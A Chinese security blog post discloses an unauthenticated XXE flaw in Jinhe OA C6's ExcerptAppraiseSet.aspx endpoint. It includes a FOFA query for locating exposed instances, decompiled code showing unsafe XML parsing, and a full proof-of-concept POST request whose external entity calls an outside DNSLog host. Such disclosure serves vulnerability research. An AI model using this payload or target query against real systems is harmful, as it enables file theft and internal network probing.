---
title: "金和OA ExcerptAppraiseSet.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-ExcerptAppraiseSet-xxe.html
asset_dir: assets/金和oa-excerptappraiseset.aspx-xxe漏洞
---

# 金和OA ExcerptAppraiseSet.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/24 13:30
- 450浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

漏洞扫描服务

服务器安全服务

企业安全咨询

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `ExcerptAppraiseSet.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE "XXE")漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞预警服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `ExcerptAppraiseSet.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Appraise.dll` 将其进行反编译后找到 **ExcerptAppraiseSet** 的处理逻辑

深入探索

在线安全工具

数据库

文件大小转换

```
  protected void Page_Load(object sender, EventArgs e)
  {
    this.InitText();
    this.Request.QueryString.ToString();
    string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
    XmlDocument xmlDocument = new XmlDocument();
    xmlDocument.LoadXml(end);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE "XXE")漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.Appraise/ExcerptAppraiseSet.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

网络安全

[![金和OA ExcerptAppraiseSet.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
